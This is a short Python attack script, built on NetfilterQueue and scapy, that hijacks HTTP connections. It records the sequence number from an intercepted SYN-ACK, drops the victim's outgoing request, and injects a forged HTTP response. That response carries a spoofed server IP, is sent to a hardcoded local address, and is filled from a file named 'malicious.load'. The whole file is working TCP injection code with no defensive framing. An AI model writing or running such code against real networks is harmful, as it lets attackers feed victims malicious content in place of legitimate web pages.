#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import time, sys, threading, signal, scapy.all as scapy

seq = 0
port = 0

def examine_and_accept(pkt):
	global seq, port
	synack_ip = scapy.IP(pkt.get_payload())
	synack_tcp = synack_ip.payload
	seq = synack_ip.seq + 1
	port = synack_tcp.dport
	pkt.accept()

def drop_and_reply(pkt):
	global seq, port
	pkt.drop()
	request_ip = scapy.IP(pkt.get_payload())
	request_tcp = request_ip.payload
	if request_tcp.sport != port: return
	else: response_tcp_seq = seq
	print(repr(request_ip))
	with open('malicious.load', 'rb') as f:
		response_load = f.read()
	response_load = response_load.replace(b'TIMESTRING',
		time.strftime('%a, %d %b %Y %H:%M:%S %Z', time.gmtime()))
	response_tcp = scapy.TCP()/response_load
	response_tcp.sport = 'http'
	response_tcp.dport = request_tcp.sport
	response_tcp.seq = response_tcp_seq
	response_tcp.ack = request_tcp.seq + len(request_tcp.payload)
	response_tcp.flags = 'PA'
	response_ip = scapy.IP()/response_tcp
	response_ip.src = '117.79.133.119'
	response_ip.dst = '192.168.29.49'
	response_ether = scapy.Ether()/response_ip
	print(repr(response_ether))
	scapy.sendp(response_ether, iface='eth0')

def binder(qnum, callback):
	nfqueue = NetfilterQueue()
	nfqueue.bind(qnum, callback)
	nfqueue.run()

def handler(signum, frame):
	sys.exit()

callbacks = {1: drop_and_reply, 2: examine_and_accept}
for qnum in callbacks:
	thread = threading.Thread(target=binder, args=(qnum, callbacks[qnum]))
	thread.daemon = True
	thread.start()
signal.signal(signal.SIGINT, handler)
while True: time.sleep(0.1)
